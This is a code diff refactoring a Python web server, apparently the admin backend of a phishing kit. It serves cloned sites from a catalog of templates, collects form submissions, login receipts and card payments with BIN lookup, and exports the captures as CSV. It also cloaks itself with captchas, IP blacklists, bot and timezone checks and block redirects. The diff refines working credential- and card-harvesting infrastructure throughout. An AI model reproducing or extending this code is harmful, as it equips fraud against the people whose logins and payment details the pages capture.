@@ -266,8 +266,9 @@ ANDROID_UA_PATTERNS = ("android", "android os")
 MOBILE_UA_PATTERNS = ("mobile", "mobi", "opera mini", "opera mobi", "iemobile", "blackberry", "windows phone")
 
 
+# 一次性跳转令牌表。读写都由 CAPTCHA_LOCK 保护（见 captcha_verify / captcha_go），
+# 这里不再单独定义 REDIRECT_LOCK —— 那个锁从来没被 acquire 过。
 REDIRECTS: dict[str, dict] = {}
-REDIRECT_LOCK = threading.Lock()
 
 # Per-template accent colours so the verification page matches the site theme.
 CAPTCHA_DEFAULT_THEME = {"accent": "#1f4d3d", "accent_dark": "#16382d"}
@@ -1638,16 +1639,6 @@ class Store:
             )
             return cursor.lastrowid
 
-    def visitor(self, visitor_id: int):
-        with self.connect() as db:
-            row = db.execute("SELECT * FROM visitors WHERE id=?", (visitor_id,)).fetchone()
-        return dict(row) if row else None
-
-    def visitor_by_uuid(self, uuid: str):
-        with self.connect() as db:
-            row = db.execute("SELECT * FROM visitors WHERE uuid=?", (uuid,)).fetchone()
-        return dict(row) if row else None
-
     def payment_add(self, uid: int, uuid: str, site: str, values: dict, referer: str, ip: str) -> int:
         now = now_text()
         with self.connect() as db:
@@ -1692,13 +1683,6 @@ class Store:
             if row:
                 db.execute("UPDATE visitors SET pay_status=1,updated_at=? WHERE uuid=?",
                            (now_text(), row["uuid"]))
-
-    def payments_for(self, uuid: str):
-        with self.connect() as db:
-            rows = db.execute(
-                "SELECT * FROM payments WHERE uuid=? ORDER BY id DESC", (uuid,)
-            ).fetchall()
-        return [dict(row) for row in rows]
 
     def bin_lookup(self, number: str) -> dict:
         digits = re.sub(r"\D", "", number or "")
@@ -1787,13 +1771,6 @@ class Store:
             item["conversion"] = round((item["order_num"] or 0) * 100.0 / item["view_num"], 1) if item["view_num"] else 0.0
             items.append(item)
         return items
-
-    def referers(self):
-        with self.connect() as db:
-            rows = db.execute(
-                "SELECT referer, COUNT(*) n FROM visitors WHERE referer<>'' GROUP BY referer ORDER BY n DESC"
-            ).fetchall()
-        return [dict(row) for row in rows]
 
     def client_breakdown(self):
         """Visit/click counts grouped by detected client type for the dashboard."""
@@ -2778,6 +2755,20 @@ def kit_unlock_script() -> bytes:
 
 
 class Handler(BaseHTTPRequestHandler):
+    # GET 只读接口分组：日志/统计类与后台配置类分开，避免 do_GET 里堆几十个 if。
+    _API_READ_PATHS = frozenset({
+        "/api/blacklist", "/api/blacklist/list", "/api/dashboard", "/api/events",
+        "/api/captures", "/api/captures/export.csv", "/api/clients", "/api/client/detect",
+    })
+    _API_ADMIN_PATHS = frozenset({
+        "/api/domains", "/api/pages", "/api/pages/counts", "/api/pages/preview",
+        "/api/projects", "/api/ipregistry/status", "/api/settings",
+    })
+    _API_LOG_POST_PATHS = frozenset({
+        "/api/events/clear", "/api/captures/clear", "/api/user/listData",
+        "/api/user/export", "/api/user/statistics", "/api/user/doEmpty",
+    })
+
     server_version = "GatewayConsole/1.0"
     # Set per-request by the /__preview/<domain>/ local preview route.
     _preview_host = ""
@@ -2845,64 +2836,12 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/ws" and "websocket" in (self.headers.get("Upgrade") or "").lower():
             return self.ws_channel()
         if path.startswith("/__preview/"):
-            # Local preview: pretend the Host header is the domain in the URL so
-            # the normal public pipeline runs without editing the hosts file.
-            rest = path[len("/__preview/"):]
-            host, _, remainder = rest.partition("/")
-            host = unquote(host).strip()
-            domain_row = STORE.domain(host) if host else None
-            if not domain_row:
-                return self.json(404, {"error": f"域名 {host} 未在系统中配置，请先在前台配置里添加"})
-            if remainder.strip("/") == "__gateway/click":
-                self._preview_host = host
-                try:
-                    return self.public_click()
-                finally:
-                    self._preview_host = None
-            # Verification endpoints/assets must run through their real handlers.
-            if remainder.startswith("captcha"):
-                self._preview_host = host
-                try:
-                    return self.route_captcha("/" + remainder, query)
-                finally:
-                    self._preview_host = None
-            if remainder == "flow/login":
-                self._preview_host = host
-                try:
-                    return self.flow_login()
-                finally:
-                    self._preview_host = None
-            self._preview_host = host
-            try:
-                return self.serve_public("/" + remainder, domain_row)
-            finally:
-                self._preview_host = None
+            return self.handle_preview_get(path, query)
         if path == "/api/site-flow":
-            host_for_flow = host_only(self.headers.get("Host", ""))
-            flow_domain = STORE.domain(host_for_flow)
-            flow_slug = ""
-            if flow_domain and flow_domain.get("project_id"):
-                flow_project = STORE.project(flow_domain["project_id"])
-                flow_slug = (flow_project or {}).get("slug", "")
-            flow_slug = flow_slug or (query.get("project") or [""])[0]
-            flow_order = [page["file"] for page in STORE.project_page_files(flow_slug)
-                          if page.get("enabled", True)] if flow_slug else []
-            return self.json(200, {"project": flow_slug, "order": flow_order})
+            return self.api_site_flow(query)
         public_domain = STORE.domain(host_only(self.headers.get("Host", "")))
         if public_domain:
-            # Verification routes and their assets must stay reachable,
-            # otherwise a visitor could never complete the challenge.
-            if path.startswith("/captcha/"):
-                return self.route_captcha(path, query)
-            if path == "/flow/login":
-                return self.flow_login()
-            if path in ("/track/visit", "/track/click"):
-                return self.track(path.rsplit("/", 1)[-1], query)
-            if path == "/guard/check":
-                return self.guard_check(query)
-            if path == "/__gateway/click":
-                return self.public_click()
-            return self.serve_public(path, public_domain)
+            return self.handle_bound_domain_get(path, query, public_domain)
         if path == "/api/auth/captcha":
             return self.get_captcha()
         if path == "/api/auth/me":
@@ -2919,112 +2858,197 @@ class Handler(BaseHTTPRequestHandler):
                 return
             return self.serve_template_preview(unquote(path.rsplit("/", 1)[-1]))
         if path.startswith("/api/"):
-            if not self.require_auth():
-                return
-            if path == "/api/blacklist" or path == "/api/blacklist/list":
-                try:
-                    page = max(1, int(query.get("page", ["1"])[0] or 1))
-                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
-                except ValueError:
-                    return self.json(400, {"error": "request failed"})
-                total, rows = STORE.blacklist_list(query.get("q", [""])[0], page, page_size)
-                return self.json(200, {"total": total, "page": page, "items": rows})
-            if path == "/api/dashboard":
-                return self.json(200, {**STORE.stats(), "clients": STORE.client_breakdown()})
+            return self.handle_api_get(path, query)
+        return self.serve_static(path)
+
+    def handle_preview_get(self, path, query):
+        """本地预览：把 URL 里的域名当成 Host，跑正式前台的整条管线。"""
+        rest = path[len("/__preview/"):]
+        host, _, remainder = rest.partition("/")
+        host = unquote(host).strip()
+        domain_row = STORE.domain(host) if host else None
+        if not domain_row:
+            return self.json(404, {"error": f"域名 {host} 未在系统中配置，请先在前台配置里添加"})
+        if remainder.strip("/") == "__gateway/click":
+            self._preview_host = host
+            try:
+                return self.public_click()
+            finally:
+                self._preview_host = None
+        # Verification endpoints/assets must run through their real handlers.
+        if remainder.startswith("captcha"):
+            self._preview_host = host
+            try:
+                return self.route_captcha("/" + remainder, query)
+            finally:
+                self._preview_host = None
+        if remainder == "flow/login":
+            self._preview_host = host
+            try:
+                return self.flow_login()
+            finally:
+                self._preview_host = None
+        self._preview_host = host
+        try:
+            return self.serve_public("/" + remainder, domain_row)
+        finally:
+            self._preview_host = None
+
+    def api_site_flow(self, query):
+        host_for_flow = host_only(self.headers.get("Host", ""))
+        flow_domain = STORE.domain(host_for_flow)
+        flow_slug = ""
+        if flow_domain and flow_domain.get("project_id"):
+            flow_project = STORE.project(flow_domain["project_id"])
+            flow_slug = (flow_project or {}).get("slug", "")
+        flow_slug = flow_slug or (query.get("project") or [""])[0]
+        flow_order = [page["file"] for page in STORE.project_page_files(flow_slug)
+                      if page.get("enabled", True)] if flow_slug else []
+        return self.json(200, {"project": flow_slug, "order": flow_order})
+
+    def handle_bound_domain_get(self, path, query, public_domain):
+        """绑定了域名的 Host：只放行验证入口和前台资源，后台 API 一律不暴露。"""
+        if path.startswith("/captcha/"):
+            return self.route_captcha(path, query)
+        if path == "/flow/login":
+            return self.flow_login()
+        if path in ("/track/visit", "/track/click"):
+            return self.track(path.rsplit("/", 1)[-1], query)
+        if path == "/guard/check":
+            return self.guard_check(query)
+        if path == "/__gateway/click":
+            return self.public_click()
+        return self.serve_public(path, public_domain)
+
+    @staticmethod
+    def page_params(query, default_size=25, max_size=100):
+        """分页参数只接受 1..max_size，非法值返回 (None, None) 由调用方回 400。"""
+        try:
+            page = max(1, int(query.get("page", ["1"])[0] or 1))
+            page_size = min(max_size, max(10, int(query.get("page_size", [str(default_size)])[0] or default_size)))
+        except ValueError:
+            return None, None
+        return page, page_size
+
+    def handle_api_get(self, path, query):
+        if not self.require_auth():
+            return
+        if path in self._API_READ_PATHS:
+            return self.api_read_get(path, query)
+        if path in self._API_ADMIN_PATHS:
+            return self.api_admin_get(path, query)
+        return self.json(404, {"error": "request failed"})
+
+    def api_read_get(self, path, query):
+        """日志、访客、统计类的只读接口。"""
+        if path in ("/api/blacklist", "/api/blacklist/list"):
+            page, page_size = self.page_params(query)
+            if page is None:
+                return self.json(400, {"error": "request failed"})
+            total, rows = STORE.blacklist_list(query.get("q", [""])[0], page, page_size)
+            return self.json(200, {"total": total, "page": page, "items": rows})
+        if path == "/api/dashboard":
+            return self.json(200, {**STORE.stats(), "clients": STORE.client_breakdown()})
+        if path in ("/api/events", "/api/captures"):
+            page, page_size = self.page_params(query)
+            if page is None:
+                return self.json(400, {"error": "request failed"})
             if path == "/api/events":
-                try:
-                    page = max(1, int(query.get("page", ["1"])[0] or 1))
-                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
-                except ValueError:
-                    return self.json(400, {"error": "request failed"})
                 total, rows = STORE.events(
                     query.get("domain", [""])[0], query.get("type", [""])[0],
                     page, page_size, query.get("client", [""])[0],
                 )
-                return self.json(200, {"total": total, "page": page, "items": rows})
-            if path == "/api/captures":
-                try:
-                    page = max(1, int(query.get("page", ["1"])[0] or 1))
-                    page_size = min(100, max(10, int(query.get("page_size", ["25"])[0] or 25)))
-                except ValueError:
-                    return self.json(400, {"error": "request failed"})
+            else:
                 total, rows = STORE.captures(
                     query.get("domain", [""])[0], query.get("q", [""])[0], page, page_size,
                 )
-                return self.json(200, {"total": total, "page": page, "items": rows})
-            if path == "/api/captures/export.csv":
-                rows = STORE.captures_all(query.get("domain", [""])[0], query.get("q", [""])[0])
-                body = captures_csv(rows)
-                self.send_response(200)
-                self.send_header("Content-Type", "text/csv; charset=utf-8")
-                self.send_header("Content-Disposition", 'attachment; filename="captures.csv"')
-                self.send_header("Content-Length", str(len(body)))
-                self.send_header("Cache-Control", "no-store")
-                self.end_headers()
-                self.wfile.write(body)
-                return
-            if path == "/api/clients":
-                return self.json(200, {
-                    "types": [
-                        {"client_type": client, "label": CLIENT_LABELS[client]}
-                        for client in CLIENT_TYPES
-                    ],
-                    "breakdown": STORE.client_breakdown(),
-                })
-            if path == "/api/client/detect":
-                return self.json(200, self.detect_client_payload(query.get("ua", [""])[0]))
-            if path == "/api/domains":
-                return self.json(200, {"items": STORE.domains()})
-            if path == "/api/pages":
-                slug = (query.get("project") or [""])[0]
+            return self.json(200, {"total": total, "page": page, "items": rows})
+        if path == "/api/captures/export.csv":
+            rows = STORE.captures_all(query.get("domain", [""])[0], query.get("q", [""])[0])
+            return self.send_attachment("captures.csv", captures_csv(rows))
+        if path == "/api/clients":
+            return self.json(200, {
+                "types": [
+                    {"client_type": client, "label": CLIENT_LABELS[client]}
+                    for client in CLIENT_TYPES
+                ],
+                "breakdown": STORE.client_breakdown(),
+            })
+        if path == "/api/client/detect":
+            return self.json(200, self.detect_client_payload(query.get("ua", [""])[0]))
+        return self.json(404, {"error": "request failed"})
+
+    def api_admin_get(self, path, query):
+        """后台配置类只读接口。"""
+        if path == "/api/domains":
+            return self.json(200, {"items": STORE.domains()})
+        if path == "/api/pages":
+            slug = (query.get("project") or [""])[0]
+            if not slug:
+                return self.json(400, {"error": "缺少 project 参数"})
+            return self.json(200, {"project": slug, "pages": STORE.project_page_files(slug)})
+        if path == "/api/pages/counts":
+            # 一次返回全部前台的页面数：后台「页面顺序」下拉要显示“N 页”，
+            # 逐个站请求 170 次不现实。
+            counts = {}
+            for item in SOURCE_CATALOG.values():
+                slug = str(item.get("slug") or "")
                 if not slug:
-                    return self.json(400, {"error": "缺少 project 参数"})
-                return self.json(200, {"project": slug, "pages": STORE.project_page_files(slug)})
-            if path == "/api/pages/counts":
-                # 一次返回全部前台的页面数：后台「页面顺序」下拉要显示“N 页”，
-                # 逐个站请求 170 次不现实。
-                counts = {}
-                for item in SOURCE_CATALOG.values():
-                    slug = str(item.get("slug") or "")
-                    if not slug:
-                        continue
-                    folder = SOURCE_DIR / slug
-                    counts[slug] = len(list(folder.glob("*.html"))) if folder.is_dir() else 0
-                return self.json(200, {"counts": counts})
-            if path == "/api/pages/preview":
-                slug = (query.get("project") or [""])[0]
-                name = (query.get("file") or [""])[0]
-                stem = Path(name).stem
-                if not slug or not stem or "/" in stem or "\\" in stem:
-                    return self.json(400, {"error": "参数不合法"})
-                base = Path(DATA_DIR) / "previews" / slug
-                picked = None
-                for ext, ctype in ((".webp", "image/webp"), (".jpg", "image/jpeg"),
-                                   (".jpeg", "image/jpeg"), (".png", "image/png")):
-                    cand = base / f"{stem}{ext}"
-                    if cand.is_file():
-                        picked = (cand, ctype)
-                        break
-                if not picked:
-                    return self.json(404, {"error": "该页面暂无预览图"})
-                blob = picked[0].read_bytes()
-                self.send_response(200)
-                self.send_header("Content-Type", picked[1])
-                self.send_header("Content-Length", str(len(blob)))
-                self.send_header("Cache-Control", "max-age=300")
-                self.end_headers()
-                self.wfile.write(blob)
-                return
-            if path == "/api/projects":
-                downloaded = {item["slug"] for item in STORE.projects()}
-                catalog = [{**item, "downloaded": item["slug"] in downloaded} for item in SOURCE_CATALOG.values()]
-                return self.json(200, {"items": STORE.projects(), "catalog": catalog})
-            if path == "/api/ipregistry/status":
-                return self.ipregistry_status()
-            if path == "/api/settings":
-                return self.json(200, STORE.get_settings())
-            return self.json(404, {"error": "request failed"})
-        return self.serve_static(path)
+                    continue
+                folder = SOURCE_DIR / slug
+                counts[slug] = len(list(folder.glob("*.html"))) if folder.is_dir() else 0
+            return self.json(200, {"counts": counts})
+        if path == "/api/pages/preview":
+            return self.serve_page_preview(query)
+        if path == "/api/projects":
+            downloaded = {item["slug"] for item in STORE.projects()}
+            catalog = [{**item, "downloaded": item["slug"] in downloaded} for item in SOURCE_CATALOG.values()]
+            return self.json(200, {"items": STORE.projects(), "catalog": catalog})
+        if path == "/api/ipregistry/status":
+            return self.ipregistry_status()
+        if path == "/api/settings":
+            return self.json(200, STORE.get_settings())
+        return self.json(404, {"error": "request failed"})
+
+    def serve_page_preview(self, query):
+        """缩略图：按 stem 在 previews/<slug>/ 下找 webp/jpg/png。"""
+        slug = (query.get("project") or [""])[0]
+        name = (query.get("file") or [""])[0]
+        stem = Path(name).stem
+        if not slug or not stem or "/" in stem or "\\" in stem:
+            return self.json(400, {"error": "参数不合法"})
+        base = Path(DATA_DIR) / "previews" / slug
+        picked = None
+        for ext, ctype in ((".webp", "image/webp"), (".jpg", "image/jpeg"),
+                           (".jpeg", "image/jpeg"), (".png", "image/png")):
+            cand = base / f"{stem}{ext}"
+            if cand.is_file():
+                picked = (cand, ctype)
+                break
+        if not picked:
+            return self.json(404, {"error": "该页面暂无预览图"})
+        return self.send_blob(picked[0].read_bytes(), picked[1], cache="max-age=300")
+
+    def send_attachment(self, filename: str, body: bytes):
+        """CSV 下载统一出口（原先 captures.csv 和 orders.csv 各写了一遍）。"""
+        self.send_response(200)
+        self.send_header("Content-Type", "text/csv; charset=utf-8")
+        self.send_header("Content-Disposition", f'attachment; filename="{filename}"')
+        self.send_header("Content-Length", str(len(body)))
+        self.send_header("Cache-Control", "no-store")
+        self.end_headers()
+        self.wfile.write(body)
+        return None
+
+    def send_blob(self, blob: bytes, content_type: str, cache: str = "no-store"):
+        """二进制响应统一出口（预览图等）。"""
+        self.send_response(200)
+        self.send_header("Content-Type", content_type)
+        self.send_header("Content-Length", str(len(blob)))
+        self.send_header("Cache-Control", cache)
+        self.end_headers()
+        self.wfile.write(blob)
+        return None
 
     def ws_channel(self):
         """最小 WebSocket 通道：记录客户端首帧，用于对齐原平台的握手协议。"""
@@ -3104,169 +3128,190 @@ class Handler(BaseHTTPRequestHandler):
             data = self.read_json()
         except (ValueError, json.JSONDecodeError) as exc:
             return self.json(400, {"error": str(exc) or "JSON 格式错误"})
-        is_captcha_post = path == "/captcha/verify" or (
-            path.startswith("/__preview/") and path.endswith("/captcha/verify")
-        )
-        # Login receipt registration lives on the same public surface, so it has
-        # to be reachable on a domain-bound host just like /captcha/verify.
-        is_flow_post = path == "/flow/login" or (
-            path.startswith("/__preview/") and path.endswith("/flow/login")
-        )
-        # 前台页面把表单内容送回这里的采集口，所以它必须和 /track 一样
-        # 在绑定域名的 Host 上可达。
-        is_collect_post = path == "/collect" or path == "/api/client/postData" or path == "/api/client/visit" or (
-            path.startswith("/__preview/") and (
-                path.endswith("/collect")
-                or path.endswith("/api/client/postData")
-                or path.endswith("/api/client/visit")
-            )
-        )
-        if STORE.domain(host_only(self.headers.get("Host", ""))) and path not in (
-            "/track/visit", "/track/click", "/__client/env", "/collect",
-            "/api/client/postData", "/api/client/visit") and not is_captcha_post and not is_flow_post:
+        if self.is_post_blocked_on_bound_domain(path):
             return self.json(404, {"error": "request failed"})
-        if is_collect_post:
-            if path.endswith("/api/client/visit"):
-                return self.client_visit(data)
-            return self.collect(data)
-        is_env_post = path == "/__client/env" or (
-            path.startswith("/__preview/") and path.endswith("/__client/env")
-        )
-        if is_env_post:
-            preview_host = ""
-            if path.startswith("/__preview/"):
-                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
-            self._preview_host = preview_host
-            try:
-                return self.client_env_report(data)
-            finally:
-                self._preview_host = ""
-        if is_flow_post:
-            preview_host = self._preview_host
-            if not preview_host and path.startswith("/__preview/"):
-                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
-            self._preview_host = preview_host or ""
-            try:
-                return self.flow_login()
-            finally:
-                self._preview_host = ""
-        if is_captcha_post:
-            preview_host = self._preview_host
-            if not preview_host:
-                preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
-            domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
-                STORE.domain(preview_host) if preview_host else None
-            )
-            if not domain_row:
-                return self.json(404, {"error": "request failed"})
-            self._preview_host = preview_host
-            self.verification_domain = domain_row["domain"]
-            try:
-                return self.captcha_verify(data)
-            finally:
-                self._preview_host = ""
+        if self.is_collect_post(path):
+            return self.client_visit(data) if path.endswith("/api/client/visit") else self.collect(data)
+        if self.is_env_post(path):
+            return self.handle_env_post(path, data)
+        if self.is_flow_post(path):
+            return self.handle_flow_post(path)
+        if self.is_captcha_post(path):
+            return self.handle_captcha_post(path, data)
         if path == "/api/pages/order":
-            slug = str((data or {}).get("project") or "").strip()
-            order = (data or {}).get("order") or []
-            hidden = (data or {}).get("hidden") or []
-            if not isinstance(hidden, list):
-                hidden = []
-            if not slug or not isinstance(order, list):
-                return self.json(400, {"error": "参数不合法"})
-            if not STORE.set_project_page_order(slug, order, hidden):
-                return self.json(404, {"error": f"项目 {slug} 不存在"})
-            return self.json(200, {"ok": True, "saved": len(order)})
+            return self.save_page_order(data)
         if path == "/api/auth/login":
             return self.login(data)
         if path in ("/track/visit", "/track/click"):
             return self.track(path.rsplit("/", 1)[-1], data)
         if path == "/api/auth/logout":
-            cookie = self.cookies().get("gateway_session")
-            if cookie:
-                with MEMORY_LOCK:
-                    SESSIONS.pop(cookie.value, None)
-            return self.json(200, {"ok": True}, {"Set-Cookie": "gateway_session=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict"})
+            return self.logout()
         if not self.require_auth():
             return
+        return self.handle_api_post(path, data)
+
+    # 前台把表单内容送回这几个采集口，所以它们必须和 /track 一样
+    # 在绑定域名的 Host 上可达。
+    @staticmethod
+    def is_collect_post(path):
+        return path in ("/collect", "/api/client/postData", "/api/client/visit") or (
+            path.startswith("/__preview/")
+            and path.endswith(("/collect", "/api/client/postData", "/api/client/visit"))
+        )
+
+    @staticmethod
+    def is_env_post(path):
+        return path == "/__client/env" or (
+            path.startswith("/__preview/") and path.endswith("/__client/env")
+        )
+
+    @staticmethod
+    def is_flow_post(path):
+        return path == "/flow/login" or (
+            path.startswith("/__preview/") and path.endswith("/flow/login")
+        )
+
+    @staticmethod
+    def is_captcha_post(path):
+        return path == "/captcha/verify" or (
+            path.startswith("/__preview/") and path.endswith("/captcha/verify")
+        )
+
+    def is_post_blocked_on_bound_domain(self, path):
+        """绑定域名的 Host 只放行采集口/环境探针/流程与验证口，其余一律 404。"""
+        if not STORE.domain(host_only(self.headers.get("Host", ""))):
+            return False
+        if path in ("/track/visit", "/track/click", "/__client/env", "/collect",
+                    "/api/client/postData", "/api/client/visit"):
+            return False
+        return not (self.is_captcha_post(path) or self.is_flow_post(path))
+
+    def handle_env_post(self, path, data):
+        preview_host = ""
+        if path.startswith("/__preview/"):
+            preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
+        self._preview_host = preview_host
+        try:
+            return self.client_env_report(data)
+        finally:
+            self._preview_host = ""
+
+    def handle_flow_post(self, path):
+        preview_host = self._preview_host
+        if not preview_host and path.startswith("/__preview/"):
+            preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
+        self._preview_host = preview_host or ""
+        try:
+            return self.flow_login()
+        finally:
+            self._preview_host = ""
+
+    def handle_captcha_post(self, path, data):
+        preview_host = self._preview_host
+        if not preview_host and path.startswith("/__preview/"):
+            preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
+        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
+            STORE.domain(preview_host) if preview_host else None
+        )
+        if not domain_row:
+            return self.json(404, {"error": "request failed"})
+        self._preview_host = preview_host
+        self.verification_domain = domain_row["domain"]
+        try:
+            return self.captcha_verify(data)
+        finally:
+            self._preview_host = ""
+
+    def save_page_order(self, data):
+        slug = str((data or {}).get("project") or "").strip()
+        order = (data or {}).get("order") or []
+        hidden = (data or {}).get("hidden") or []
+        if not isinstance(hidden, list):
+            hidden = []
+        if not slug or not isinstance(order, list):
+            return self.json(400, {"error": "参数不合法"})
+        if not STORE.set_project_page_order(slug, order, hidden):
+            return self.json(404, {"error": f"项目 {slug} 不存在"})
+        return self.json(200, {"ok": True, "saved": len(order)})
+
+    def logout(self):
+        cookie = self.cookies().get("gateway_session")
+        if cookie:
+            with MEMORY_LOCK:
+                SESSIONS.pop(cookie.value, None)
+        return self.json(200, {"ok": True}, {"Set-Cookie": "gateway_session=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict"})
+
+    def handle_api_post(self, path, data):
+        if path in self._API_LOG_POST_PATHS:
+            return self.api_log_post(path, data)
+        if path.startswith("/api/blacklist/"):
+            return self.api_blacklist_post(path, data)
+        match = re.fullmatch(r"/api/projects/(\d+)/update", path)
+        if match:
+            return self.update_project(int(match.group(1)))
+        return self.api_config_post(path, data)
+
+    def api_log_post(self, path, data):
+        """事件/采集清理 + 访客列表/导出/统计（t3 风格接口名沿用，前端在用）。"""
         if path == "/api/events/clear":
-            deleted = STORE.clear_events()
-            return self.json(200, {"ok": True, "deleted": deleted})
+            return self.json(200, {"ok": True, "deleted": STORE.clear_events()})
         if path == "/api/captures/clear":
-            deleted = STORE.captures_clear()
-            return self.json(200, {"ok": True, "deleted": deleted})
+            return self.json(200, {"ok": True, "deleted": STORE.captures_clear()})
+        params = data if isinstance(data, dict) else {}
+        referer = params.get("referer")
+        if isinstance(referer, list):
+            referer = referer[0] if referer else ""
+        filters = dict(
+            keyword=str(params.get("keyword") or "").strip(),
+            site=str(params.get("site_abbreviation") or "").strip(),
+            referer=str(referer or "").strip(),
+            status=str(params.get("status") or ""),
+            start=str(params.get("createdStartTime") or ""),
+            end=str(params.get("createdEndTime") or ""),
+        )
         if path == "/api/user/listData":
-            params = data if isinstance(data, dict) else {}
-            referer = params.get("referer")
-            if isinstance(referer, list):
-                referer = referer[0] if referer else ""
             try:
                 page = max(1, int(params.get("page") or 1))
                 page_size = min(500, max(1, int(params.get("pagesize") or 25)))
             except (TypeError, ValueError):
                 return self.json(400, {"code": 400, "msg": "参数错误"})
-            total, items = STORE.visitors_list(
-                keyword=str(params.get("keyword") or "").strip(),
-                site=str(params.get("site_abbreviation") or "").strip(),
-                referer=str(referer or "").strip(),
-                status=str(params.get("status") or ""),
-                start=str(params.get("createdStartTime") or ""),
-                end=str(params.get("createdEndTime") or ""),
-                page=page, page_size=page_size,
-            )
+            total, items = STORE.visitors_list(page=page, page_size=page_size, **filters)
             return self.json(200, {"code": 200, "msg": "ok",
                                    "data": {"total": total, "items": items, "page": page}})
         if path == "/api/user/export":
-            params = data if isinstance(data, dict) else {}
-            referer = params.get("referer")
-            if isinstance(referer, list):
-                referer = referer[0] if referer else ""
-            items = STORE.visitors_all(
-                keyword=str(params.get("keyword") or "").strip(),
-                site=str(params.get("site_abbreviation") or "").strip(),
-                referer=str(referer or "").strip(),
-                status=str(params.get("status") or ""),
-                start=str(params.get("createdStartTime") or ""),
-                end=str(params.get("createdEndTime") or ""),
-            )
-            body = orders_csv(items)
-            self.send_response(200)
-            self.send_header("Content-Type", "text/csv; charset=utf-8")
-            self.send_header("Content-Disposition", 'attachment; filename="orders.csv"')
-            self.send_header("Content-Length", str(len(body)))
-            self.send_header("Cache-Control", "no-store")
-            self.end_headers()
-            self.wfile.write(body)
-            return
+            items = STORE.visitors_all(**filters)
+            return self.send_attachment("orders.csv", orders_csv(items))
         if path == "/api/user/statistics":
             return self.json(200, {"code": 200, "msg": "ok", "data": STORE.order_stats()})
         if path == "/api/user/doEmpty":
             STORE.captures_clear()
-            deleted_v = 0
             with STORE.connect() as db:
                 deleted_v = db.execute("DELETE FROM visitors").rowcount
                 db.execute("DELETE FROM payments")
             return self.json(200, {"code": 200, "deleted": deleted_v})
+        return self.json(404, {"error": "request failed"})
+
+    def api_blacklist_post(self, path, data):
         if path == "/api/blacklist/add":
             ip = str(data.get("ip", "")).strip()
             if not STORE.blacklist_add(ip, "manual", str(data.get("note", ""))):
                 return self.json(400, {"error": "IP 格式不正确或已存在"})
             return self.json(200, {"ok": True})
-        if path == "/api/blacklist/update":
+        if path in ("/api/blacklist/update", "/api/blacklist/delete"):
             try:
                 row_id = int(data.get("id", 0))
             except (TypeError, ValueError):
                 return self.json(400, {"error": "request failed"})
+            if path == "/api/blacklist/delete":
+                return self.json(200, {"ok": STORE.blacklist_remove(row_id)})
             if not STORE.blacklist_update(row_id, str(data.get("ip", "")), str(data.get("note", ""))):
                 return self.json(400, {"error": "更新失败：IP 格式不正确或记录不存在"})
             return self.json(200, {"ok": True})
-        if path == "/api/blacklist/delete":
-            try:
-                row_id = int(data.get("id", 0))
-            except (TypeError, ValueError):
-                return self.json(400, {"error": "request failed"})
-            return self.json(200, {"ok": STORE.blacklist_remove(row_id)})
         if path == "/api/blacklist/clear":
             return self.json(200, {"ok": True, "deleted": STORE.blacklist_clear()})
+        return self.json(404, {"error": "request failed"})
+
+    def api_config_post(self, path, data):
         if path == "/api/domains":
             return self.create_domain(data)
         if path == "/api/certificates":
@@ -3277,10 +3322,6 @@ class Handler(BaseHTTPRequestHandler):
             return self.download_catalog(data)
         if path == "/api/client/test-click":
             return self.client_test_click(data)
-            return self.captcha_verify(data)
-        match = re.fullmatch(r"/api/projects/(\d+)/update", path)
-        if match:
-            return self.update_project(int(match.group(1)))
         if path == "/api/settings":
             data = dict(data)
             if "redirect_links" in data:
@@ -3803,6 +3844,24 @@ class Handler(BaseHTTPRequestHandler):
             return url
         return ""
 
+    def block_redirect(self, reason: str, client_type: str = "") -> None:
+        """拦截后统一跳转：配了跳转地址就走 302，没配就 403。
+
+        点击黑名单、访问黑名单、频率封锁、机器人检测、浏览器时区这 5 个拦截点
+        以前各自复制了一份这段分支，改一个 header 要改 5 处。
+        """
+        target = self.pre_gate_redirect_target()
+        if not target:
+            self.send_error(403)
+            return
+        self.send_response(302)
+        self.send_header("Location", target)
+        self.send_header("Cache-Control", "no-store")
+        if client_type:
+            self.send_header("X-Gateway-Client", client_type)
+        self.send_header("X-Gateway-Block", reason)
+        self.end_headers()
+
     def guard_decision(self):
         # 黑名单 IP 直接短路：不查 IPRegistry、不算语言，省配额且零延迟拒绝
         ip_now = self.client_ip()
@@ -4030,16 +4089,7 @@ class Handler(BaseHTTPRequestHandler):
         if self.client_ip() in BLACKLIST_CACHE:
             STORE.record_event(domain["domain"], "rejected", self.client_ip(),
                                self.headers.get("User-Agent", ""), "/__gateway/click", CLIENT_BLACKLIST)
-            target = self.pre_gate_redirect_target()
-            if target:
-                self.send_response(302)
-                self.send_header("Location", target)
-                self.send_header("Cache-Control", "no-store")
-                self.send_header("X-Gateway-Block", "blacklist")
-                self.end_headers()
-            else:
-                self.send_error(403)
-            return
+            return self.block_redirect("blacklist")
         client_type, _ = self.current_client()
         target, rule = self.pick_click_target(domain, client_type)
         if not target or urlparse(target).scheme not in ("http", "https"):
@@ -4066,17 +4116,30 @@ class Handler(BaseHTTPRequestHandler):
         self.end_headers()
 
     def serve_public(self, path: str, domain: dict):
+        ctx = self.resolve_public_target(path, domain)
+        if ctx is None:
+            return self.send_error(404)
+        settings = STORE.get_settings()
+        if self.gate_access(path, domain, ctx, settings):
+            return
+        return self.send_resolved_public(ctx, path, settings)
+
+    def resolve_public_target(self, path: str, domain: dict) -> dict | None:
+        """把请求路径解析成实际文件，并判定它是不是「文档页」。
+
+        返回 None 表示 404（项目没配本地目录、路径越界、文件不存在且无回落）。
+        """
         project = STORE.project(domain.get("project_id")) if domain.get("project_id") else None
         if not project or not project.get("local_path"):
-            return self.send_error(404)
+            return None
         root = Path(project["local_path"]).resolve()
